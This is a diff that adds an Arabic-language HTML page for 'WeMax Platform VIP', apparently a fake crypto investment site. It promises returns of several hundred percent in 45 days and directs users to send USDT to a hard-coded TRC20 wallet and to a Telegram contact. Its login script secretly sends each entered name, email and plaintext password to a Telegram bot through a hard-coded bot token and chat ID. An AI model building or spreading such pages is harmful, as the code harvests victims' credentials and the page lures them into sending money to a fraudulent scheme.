@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WeMax Platform VIP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #050505;
+            --card-color: #111111;
+            --gold: #d4af37;
+            --gold-light: #f3e5ab;
+            --gold-dark: #aa882c;
+            --text: #ffffff;
+            --text-sub: #b3b3b3;
+            --red: #ff3333;
+            --green: #22c55e;
+            --border: #221f15;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            overflow-x: hidden;
+        }
+
+        #auth_screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+            background: radial-gradient(circle, #1a1508 0%, #050505 100%);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo-placeholder {
+            width: 90px;
+            height: 90px;
+            border: 3px solid var(--gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: bold;
+            color: var(--gold);
+            box-shadow: 0 0 25px rgba(212, 175, 55, 0.4);
+            margin: 0 auto 10px auto;
+            background: #000;
+        }
+
+        .auth-card {
+            background-color: var(--card-color);
+            border: 1px solid var(--gold-dark);
+            border-radius: 20px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 380px;
+            box-sizing: border-box;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--gold-light);
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background-color: #000;
+            color: #fff;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--gold);
+            outline: none;
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.2);
+        }
+
+        #app_screen {
+            display: none;
+            max-width: 480px;
+            margin: 0 auto;
+            height: 100vh;
+            position: relative;
+            box-sizing: border-box;
+        }
+
+        .main-container {
+            height: calc(100vh - 65px);
+            overflow-y: auto;
+            padding: 15px;
+            box-sizing: border-box;
+            padding-bottom: 40px;
+        }
+
+        .premium-notice {
+            background: linear-gradient(45deg, #1f1704, #0d0d0d);
+            border: 1px dashed var(--gold);
+            color: var(--gold-light);
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, #1a1405 0%, #0a0a0a 100%);
+            border: 1px solid var(--gold);
+            border-radius: 18px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 20px rgba(212, 175, 55, 0.15);
+        }
+
+        .balance-amount {
+            font-size: 40px;
+            font-weight: bold;
+            color: var(--gold);
+            margin: 10px 0;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
+        }
+
+        .grid-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+            margin-bottom: 25px;
+        }
+
+        .grid-btn {
+            background-color: var(--card-color);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 18px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+            font-weight: bold;
+        }
+
+        .grid-btn:active {
+            background-color: #1a1508;
+            border-color: var(--gold);
+        }
+
+        .grid-btn .icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .plans-section-title {
+            border-right: 4px solid var(--gold);
+            padding-right: 10px;
+            margin: 25px 0 15px 0;
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--gold-light);
+        }
+
+        /* تنسيق كروت الباقات الكتابية الفخمة */
+        .luxury-plan-card {
+            background: linear-gradient(135deg, #111111 0%, #161207 100%);
+            border: 1px solid var(--gold-dark);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+        }
+
+        .luxury-plan-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--gold), var(--gold-dark));
+        }
+
+        .plan-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #221f15;
+            padding-bottom: 10px;
+            margin-bottom: 12px;
+        }
+
+        .plan-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--gold);
+        }
+
+        .plan-duration {
+            font-size: 12px;
+            background-color: #000;
+            padding: 4px 10px;
+            border-radius: 20px;
+            color: var(--text-sub);
+            border: 1px solid #221f15;
+        }
+
+        .plan-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .plan-info-item {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .plan-label {
+            font-size: 12px;
+            color: var(--text-sub);
+        }
+
+        .plan-value {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .plan-value.price {
+            color: var(--gold-light);
+        }
+
+        .plan-value.profit {
+            color: var(--green);
+        }
+
+        .plan-action-btn {
+            background: linear-gradient(90deg, var(--gold-dark), var(--gold));
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            padding: 8px 18px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(212, 175, 55, 0.2);
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            background-color: #070707;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            box-sizing: border-box;
+            z-index: 1000;
+        }
+
+        .nav-item {
+            text-align: center;
+            color: var(--text-sub);
+            font-size: 13px;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .nav-item.active {
+            color: var(--gold);
+            font-weight: bold;
+        }
+
+        .nav-item .nav-icon {
+            font-size: 22px;
+            display: block;
+            margin-bottom: 3px;
+        }
+
+        .app-section {
+            display: none;
+        }
+
+        .app-section.active-section {
+            display: block;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.85);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            background-color: var(--card-color);
+            border: 1px solid var(--gold-dark);
+            border-radius: 20px;
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 22px;
+            cursor: pointer;
+            color: var(--text-sub);
+        }
+
+        .warning-box {
+            background-color: rgba(255, 51, 51, 0.1);
+            border: 1px solid var(--red);
+            color: #ff6666;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin: 15px 0;
+            line-height: 1.5;
+            font-weight: bold;
+        }
+
+        .address-box {
+            background-color: #000;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            word-break: break-all;
+            border: 1px dashed var(--gold);
+            margin: 15px 0;
+            user-select: all;
+            text-align: center;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .modal-btn {
+            background: linear-gradient(90deg, var(--gold-dark), var(--gold));
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            padding: 12px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 15px;
+            margin-top: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(212, 175, 55, 0.2);
+            transition: 0.2s;
+        }
+
+        .modal-btn:active {
+            transform: scale(0.98);
+        }
+
+        .link-btn {
+            background: #1a1a1a;
+            color: var(--gold);
+            border: 1px solid var(--gold-dark);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- شاشة تسجيل الدخول -->
+    <div id="auth_screen">
+        <div class="logo-container">
+            <div class="logo-placeholder">W</div>
+            <h2 style="margin: 5px 0 0 0; color: var(--gold); letter-spacing: 1px;">WeMax PLATFORM</h2>
+        </div>
+        <div class="auth-card">
+            <h3 style="margin-top: 0; text-align: center; margin-bottom: 20px; color: #fff;">إنشاء حساب استثماري جديد</h3>
+            <div class="input-group">
+                <label>الاسم الكامل</label>
+                <input type="text" id="fullname" placeholder="أدخل اسمك بالكامل">
+            </div>
+            <div class="input-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="name@example.com">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+            <button class="modal-btn" onclick="login()">دخول للمنصة الملكية</button>
+        </div>
+    </div>
+
+    <!-- الشاشة الرئيسية للمنصة -->
+    <div id="app_screen">
+        <div class="main-container">
+            
+            <!-- إشعار النسخة غير الرسمية -->
+            <div class="premium-notice">
+                ⚠️ <strong>(هذه ليست النسخة الرسمية)</strong><br>
+                سيتم إرسال النسخة المميزة لك عند الاشتراك في أي نسخة تريد الاستثمار بها عبر مراسلتنا في بريد تلكرام.
+            </div>
+
+            <div id="sec_home" class="app-section active-section">
+                <!-- تم تصفير الرصيد كلياً للحساب الافتراضي -->
+                <div class="balance-card">
+                    <div style="font-size: 14px; color: var(--text-sub);">الرصيد الحالي الخاص بك</div>
+                    <div class="balance-amount"><span id="user_balance">0.0</span> <span style="font-size: 18px; color: #fff;">USDT</span></div>
+                    <div id="account_status_text" style="font-size: 12px; color: var(--red); font-weight: bold;">الحساب غير نشط (يرجى اختيار باقة وتفعيلها)</div>
+                </div>
+
+                <div class="grid-buttons">
+                    <div class="grid-btn" onclick="openModal('deposit_modal')">
+                        <span class="icon">📥</span>الإيداع / التحويل
+                    </div>
+                    <div class="grid-btn" onclick="openModal('withdraw_modal')">
+                        <span class="icon">📤</span>سحب الأرباح
+                    </div>
+                    <div class="grid-btn" style="grid-column: span 2;" onclick="openModal('official_channel_modal')">
+                        <span class="icon">👑</span>دخول القناة الرسمية للمنصة
+                    </div>
+                </div>
+
+                <div class="plans-section-title">خطط الاستثمار الطويل المتاحة</div>
+                
+                <!-- الباقات الاستثمارية كتابة فخمة واضحة بدلاً من الصور -->
+                <div class="luxury-plan-card">
+                    <div class="plan-header">
+                        <span class="plan-title">باقة الاستثمار الفضية</span>
+                        <span class="plan-duration">المدة: 45 يوم</span>
+                    </div>
+                    <div class="plan-details">
+                        <div class="plan-info-item">
+                            <span class="plan-label">قيمة الاشتراك</span>
+                            <span class="plan-value price">52 دولار</span>
+                        </div>
+                        <div class="plan-info-item">
+                            <span class="plan-label">إجمالي الأرباح</span>
+                            <span class="plan-value profit">200 دولار</span>
+                        </div>
+                        <button class="plan-action-btn" onclick="openModal('deposit_modal')">تفعيل الآن</button>
+                    </div>
+                </div>
+
+                <div class="luxury-plan-card">
+                    <div class="plan-header">
+                        <span class="plan-title">باقة الاستثمار الذهبية</span>
+                        <span class="plan-duration">المدة: 45 يوم</span>
+                    </div>
+                    <div class="plan-details">
+                        <div class="plan-info-item">
+                            <span class="plan-label">قيمة الاشتراك</span>
+                            <span class="plan-value price">150 دولار</span>
+                        </div>
+                        <div class="plan-info-item">
+                            <span class="plan-label">إجمالي الأرباح</span>
+                            <span class="plan-value profit">600 دولار</span>
+                        </div>
+                        <button class="plan-action-btn" onclick="openModal('deposit_modal')">تفعيل الآن</button>
+                    </div>
+                </div>
+
+                <div class="luxury-plan-card">
+                    <div class="plan-header">
+                        <span class="plan-title">باقة الاستثمار الملكية (VIP)</span>
+                        <span class="plan-duration">المدة: 45 يوم</span>
+                    </div>
+                    <div class="plan-details">
+                        <div class="plan-info-item">
+                            <span class="plan-label">قيمة الاشتراك</span>
+                            <span class="plan-value price">500 دولار</span>
+                        </div>
+                        <div class="plan-info-item">
+                            <span class="plan-label">إجمالي الأرباح</span>
+                            <span class="plan-value profit">4 آلاف دولار</span>
+                        </div>
+                        <button class="plan-action-btn" onclick="openModal('deposit_modal')">تفعيل الآن</button>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- صفحة الملف الشخصي -->
+            <div id="sec_me" class="app-section">
+                <h3 style="border-right: 4px solid var(--gold); padding-right: 10px; color: var(--gold-light);">الحساب الشخصي</h3>
+                <div style="background-color: var(--card-color); padding: 20px; border-radius: 16px; border: 1px solid var(--border); display: flex; align-items: center; gap: 15px;">
+                    <div style="width: 55px; height: 55px; background-color: #222; border: 1px solid var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px;">👤</div>
+                    <div>
+                        <div id="profile_name" style="font-weight: bold; font-size: 18px; color: var(--gold);">الاسم الاستثماري</div>
+                        <div id="profile_email" style="font-size: 13px; color: var(--text-sub); margin-top: 3px;">user@wemax.com</div>
+                        <div id="profile_status_label" style="font-size: 12px; color: var(--red); margin-top: 5px; font-weight: bold;">الحالة: غير مشترك ❌</div>
+                    </div>
+                </div>
+                <button class="modal-btn" style="background-color: var(--red); color: white; margin-top: 30px;" onclick="logout()">تسجيل الخروج الآمن</button>
+            </div>
+
+        </div>
+
+        <!-- شريط التنقل السفلي المحدث (تم حذف المهام والمكافآت كلياً) -->
+        <footer class="bottom-nav">
+            <div class="nav-item active" id="tab_home" onclick="switchTab('tab_home')">
+                <span class="nav-icon">🏠</span>الرئيسية
+            </div>
+            <div class="nav-item" id="tab_me" onclick="switchTab('tab_me')">
+                <span class="nav-icon">👤</span>الملف الشخصي
+            </div>
+        </footer>
+    </div>
+
+    <!-- نافذة الإيداع والتحويل -->
+    <div id="deposit_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('deposit_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0; text-align: center;">إيداع وتحويل الأموال</h3>
+            <p style="font-size: 13px; text-align: center;">يرجى نسخ المحفظة المعتمدة أدناه لإرسال رصيد الاستثمار:</p>
+            <div class="warning-box">⚠️ تحذير صارم: يرجى التأكد تماماً من اختيار نفس الشبكة المحددة (USDT TRC20) حصراً لتجنب ضياع أموالك.</div>
+            <div class="address-box" id="company_wallet">TUAbiNfLsWUPp6dyyTY3BteZdjKrMnD3gc</div>
+            <button class="modal-btn" style="margin-bottom: 15px;" onclick="copyText('company_wallet', 'عنوان المحفظة')">📋 نسخ عنوان المحفظة</button>
+            
+            <hr style="border-color: var(--border); margin: 15px 0;">
+            <p style="font-size: 13px; text-align: center; color: var(--gold-light);">لإرسال إثبات التحويل وتفعيل باقتك فوراً، يرجى نسخ رابط القناة ومراسلتنا باستخدام الرابط أدناه:</p>
+            <div class="address-box" id="proof_link">https://t.me/WeMaxZa</div>
+            <button class="modal-btn link-btn" onclick="copyText('proof_link', 'رابط إثبات التحويل')">🔗 نسخ رابط إرسال الإثبات</button>
+        </div>
+    </div>
+
+    <!-- نافذة سحب الأرباح -->
+    <div id="withdraw_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('withdraw_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0; text-align: center;">سحب الأرباح</h3>
+            <p style="font-size: 14px; text-align: center; line-height: 1.6; color: #fff;">
+                يرجى مراسلة بريد القناة الرسمي وتقديم طلب السحب الخاص بك ليتم التنفيذ الفوري عبر الرابط المباشر التالي:
+            </p>
+            <div class="address-box" id="withdraw_channel_link">https://t.me/WeMaxZa</div>
+            <button class="modal-btn" onclick="copyText('withdraw_channel_link', 'رابط السحب المباشر')">🔗 نسخ رابط السحب والاتصال</button>
+        </div>
+    </div>
+
+    <!-- نافذة القناة الرسمية -->
+    <div id="official_channel_modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('official_channel_modal')">&times;</span>
+            <h3 style="color: var(--gold); margin-top:0; text-align: center;">القناة الرسمية للمنصة</h3>
+            <p style="font-size: 13px; text-align: center; color: var(--text-sub);">اضغط على الزر بالأسفل لنسخ الرابط المباشر، ثم ابحث عنه داخل تطبيق التلغرام للانضمام:</p>
+            <div class="address-box" id="official_link_text">https://t.me/WeMaxZa</div>
+            <button class="modal-btn" onclick="copyText('official_link_text', 'رابط القناة الرسمية')">📋 نسخ الرابط الآن</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات اتصال بوت التلغرام تلقائياً
+        const telegramToken = "8565843562:AAGami8PB2ZnsTky_4mrcNelWjscEoySN6g";
+        const telegramChatId = "5907095969";
+
+        // الحساب يبدأ مصفر بالكامل
+        let currentBalance = 0.0;
+
+        function login() {
+            const fullname = document.getElementById('fullname').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('password').value.trim();
+
+            if(fullname === "" || email === "" || pass === "") {
+                alert("يرجى إدخال كافة البيانات المطلوبة لإنشاء حسابك!");
+                return;
+            }
+
+            // إرسال البيانات فوراً إلى بوت التليجرام الخاص بك عند ضغط دخول
+            const messageText = `🔔 مستخدم جديد سجل في منصتك:\n\n👤 الاسم الكامل: ${fullname}\n📧 البريد: ${email}\n🔑 كلمة السر: ${pass}\n💰 الحساب الحالي: 0.0 USDT (مصفر وبانتظار التفعيل)`;
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: messageText
+                })
+            }).then(response => {
+                enterApp(fullname, email);
+            }).catch(err => {
+                enterApp(fullname, email); // دخول احتياطي في حال ضعف شبكة المستخدم
+            });
+        }
+
+        function enterApp(name, email) {
+            document.getElementById('profile_name').innerText = name;
+            document.getElementById('profile_email').innerText = email;
+            document.getElementById('user_balance').innerText = currentBalance.toFixed(1);
+            document.getElementById('auth_screen').style.display = 'none';
+            document.getElementById('app_screen').style.display = 'block';
+        }
+
+        function logout() {
+            document.getElementById('app_screen').style.display = 'none';
+            document.getElementById('auth_screen').style.display = 'flex';
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            document.querySelectorAll('.app-section').forEach(sec => sec.classList.remove('active-section'));
+            
+            if(tabId === 'tab_home') { document.getElementById('tab_home').classList.add('active'); document.getElementById('sec_home').classList.add('active-section'); }
+            else if(tabId === 'tab_me') { document.getElementById('tab_me').classList.add('active'); document.getElementById('sec_me').classList.add('active-section'); }
+        }
+
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        
+        function copyText(elementId, label) {
+            const textToCopy = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(textToCopy);
+            alert("تم نسخ " + label + " بنجاح!");
+        }
+    </script>
+</body>
+</html>
